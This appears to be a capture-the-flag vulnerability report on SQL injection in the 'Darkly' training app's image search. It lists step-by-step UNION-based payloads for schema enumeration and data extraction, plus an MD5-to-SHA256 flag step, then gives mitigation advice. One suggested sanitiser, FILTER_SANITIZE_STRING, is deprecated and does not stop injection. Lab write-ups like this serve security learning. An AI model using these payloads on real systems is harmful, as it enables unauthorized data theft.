# Vulnerability Report

## Summary

An SQL Injection vulnerability exists in the image search feature of the `Darkly` application. This flaw allows attackers to manipulate SQL queries to access unauthorized data, enumerate database schemas, and compromise sensitive information.

## Vulnerability details

### CWE Reference

- **CWE ID**: [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)

### Description

The application does not properly handle user input submitted through the search field on the `Image Search` page. The lack of parameterized queries and input validation allows attackers to inject malicious SQL payloads. By exploiting this vulnerability, attackers can enumerate the database structure, extract sensitive information, and execute unauthorized actions on the database.

### Steps to reproduce

1. Navigate to the `Image Search` feature at [searchimg](http://darkly/index.php?page=searchimg).
2. Inject `1 OR 1=1` into the search field.
3. Submit the form and observe that all images are displayed, confirming the SQL Injection vulnerability.

### Exploitation process

1. **Determine the number of columns**:
   - Inject payloads such as `ORDER BY 1`, `ORDER BY 2`, etc., to find that the query uses 2 columns.

2. **Extract database name**:
   - Inject `1 UNION SELECT NULL, DATABASE()` to retrieve the database name `Member_images`.

3. **List tables**:
   - Use `1 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 0x4d656d6265725f696d61676573` to identify the table `list_images`.

4. **Enumerate columns**:
   - Inject `1 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 0x6c6973745f696d61676573` to identify columns `id`, `url`, `title`, and `comment`.

5. **Extract data**:
   - Inject `1 UNION SELECT title, comment FROM list_images` to extract the `title` and `comment` fields from the `list_images` table.

6. **Find the flag**:
   - Locate the hint `If you read this just use this md5 decode lowercase then sha256 to win this flag!: 1928e8083cf461a51303633093573c46`.

7. **Decode MD5 and generate SHA256**:
   - Decode `1928e8083cf461a51303633093573c46` to `albatroz` using a tool like CrackStation.
   - Convert the result to SHA256 to retrieve the flag using:
     ```bash
     echo -n albatroz | sha256sum
     ```

### Impact

The impact of this vulnerability is critical. It allows attackers to:
- Access sensitive database information, such as schemas, tables, and records.
- Execute unauthorized queries, potentially leading to data breaches and system compromise.

## Mitigation

1. **Use Prepared Statements and Parameterized Queries**:
   - Replace dynamic queries with parameterized ones. Example in PHP:
     ```php
     $stmt = $pdo->prepare("SELECT * FROM list_images WHERE id = ?");
     $stmt->execute([$id]);
     ```

2. **Input Validation**:
   - Validate and sanitize all user inputs server-side. Reject patterns indicative of SQL Injection.
   - **Example**: Use a whitelist to restrict input to expected patterns and lengths. In PHP:
     ```php
     if (!preg_match('/^[a-zA-Z0-9_]+$/', $input)) {
         die("Invalid input.");
     }
     ```
   - Alternatively, use a validation library such as `filter_var()`:
     ```php
     $input = filter_var($input, FILTER_SANITIZE_STRING);
     ```

## References

2. [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
